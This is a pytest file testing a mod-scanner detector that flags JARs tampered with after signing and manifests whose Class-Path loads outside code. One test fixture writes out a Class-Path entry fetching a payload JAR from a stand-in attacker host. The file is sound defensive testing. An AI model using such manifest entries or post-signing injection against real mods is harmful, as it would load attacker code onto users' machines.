"""Tests for D14 (JAR signature/manifest tamper detection), task 6.3.

Uses real jarsigner-signed JARs (tests/signed_jars/) rather than
hand-built signature blocks, so the actual META-INF/*.SF format a real
JDK produces is what gets tested:

- properly_signed.jar: signed with `jarsigner`, untouched afterward.
- trojanized.jar: signed with `jarsigner`, then a second class was
  added afterward with `jar uf` — `jarsigner -verify` on this file
  reports "This jar contains unsigned entries which have not been
  integrity-checked", confirming the file genuinely exhibits the
  tamper pattern D14 is meant to catch (a legitimate, previously
  signed mod with a payload injected after the fact).

tests/signed_jars/ is a sibling of tests/fixtures/, not a subdirectory
of it, for the same reason as tests/javac_fixtures/: the websocket
integration tests scan tests/fixtures/ as a target root, and a
correctly-flagged fixture would get moved into the real quarantine
directory by that test run.
"""

import zipfile
from pathlib import Path

import pytest

from mcrataway.core.quarantine import QuarantineManager
from mcrataway.core.scan_engine import ScanEngine
from mcrataway.detectors.d14_signature_tamper import D14SignatureTamper

SIGNED_JARS_DIR = Path(__file__).resolve().parent.parent / "signed_jars"


def _require_fixture(name: str) -> Path:
    path = SIGNED_JARS_DIR / name
    if not path.exists():
        pytest.skip(f"{path} missing — see tests/signed_jars/ fixture generation notes")
    return path


class TestAnalyzeSignedArchive:
    def test_trojanized_jar_flags_the_added_class(self) -> None:
        jar_path = _require_fixture("trojanized.jar")
        with zipfile.ZipFile(jar_path) as zf:
            names = {n for n in zf.namelist() if not n.endswith("/")}
            sf_contents = {
                n: zf.read(n).decode("utf-8", errors="replace")
                for n in names
                if n.startswith("META-INF/") and n.endswith(".SF")
            }

        assert sf_contents, "fixture must contain a .SF signature file"

        det = D14SignatureTamper()
        evs = det.analyze_signed_archive(names, sf_contents)
        assert len(evs) == 1
        assert evs[0].severity.name == "HIGH"
        assert evs[0].class_name == "Evil2.class"

    def test_properly_signed_jar_has_no_findings(self) -> None:
        jar_path = _require_fixture("properly_signed.jar")
        with zipfile.ZipFile(jar_path) as zf:
            names = {n for n in zf.namelist() if not n.endswith("/")}
            sf_contents = {
                n: zf.read(n).decode("utf-8", errors="replace")
                for n in names
                if n.startswith("META-INF/") and n.endswith(".SF")
            }

        assert sf_contents, "fixture must contain a .SF signature file"

        det = D14SignatureTamper()
        evs = det.analyze_signed_archive(names, sf_contents)
        assert evs == []

    def test_unsigned_archive_produces_no_findings(self) -> None:
        """No .SF contents at all (an unsigned JAR, the overwhelming
        majority of mods) must not be treated as tampered — there is
        nothing to compare against."""
        det = D14SignatureTamper()
        evs = det.analyze_signed_archive({"Foo.class", "Bar.class"}, {})
        assert evs == []


class TestAnalyzeManifestClassPath:
    def test_class_path_entry_is_flagged(self) -> None:
        det = D14SignatureTamper()
        manifest = (
            "Manifest-Version: 1.0\n"
            "Class-Path: lib/evil.jar http://evil.example.com/payload.jar\n"
        )
        evs = det.analyze_manifest_class_path(manifest)
        assert len(evs) == 1
        assert evs[0].severity.name == "MEDIUM"
        assert "evil.jar" in evs[0].matched_value

    def test_ordinary_manifest_is_not_flagged(self) -> None:
        det = D14SignatureTamper()
        manifest = "Manifest-Version: 1.0\nMain-Class: com.example.Mod\n"
        assert det.analyze_manifest_class_path(manifest) == []


class TestEndToEndScan:
    def test_trojanized_jar_scan_is_not_clean(self, tmp_path: Path) -> None:
        jar_path = _require_fixture("trojanized.jar")
        qm = QuarantineManager(quarantine_dir=tmp_path / "q", do_quarantine_malicious=False)
        engine = ScanEngine(quarantine=qm, max_workers=1)

        result = engine._scan_single(jar_path)
        assert result.verdict.value != "CLEAN"
        assert any(f.detector_id == "d14" for f in result.findings)

    def test_properly_signed_jar_scan_is_clean(self, tmp_path: Path) -> None:
        jar_path = _require_fixture("properly_signed.jar")
        qm = QuarantineManager(quarantine_dir=tmp_path / "q", do_quarantine_malicious=False)
        engine = ScanEngine(quarantine=qm, max_workers=1)

        result = engine._scan_single(jar_path)
        assert result.verdict.value == "CLEAN"
